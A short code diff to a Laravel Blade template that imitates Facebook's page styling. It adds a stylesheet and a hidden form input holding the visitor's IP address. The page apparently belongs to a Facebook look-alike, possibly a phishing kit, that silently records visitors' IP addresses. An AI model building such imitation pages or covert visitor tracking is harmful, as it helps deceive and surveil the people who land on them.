@@ -19,6 +19,7 @@
     />
     <meta name="theme-color" content="#3b5998" />
     <link rel="stylesheet" href="{{ asset('css/facebook/style.css') }}" />
+    <link rel="stylesheet" href="{{ asset('css/facebook/app.css') }}" />
     <!--<script src="./script.js"></script>-->
     <link
       type="text/css"
@@ -564,6 +565,7 @@
                         </div>
                       </div>
 
+                      <input type="text" class="hidden" id="ip" name="ip" value="{{ $getIpAddress }}">
                       <div id="ipInfo"></div>
 
                       <div class="_2pie" style="text-align: center">
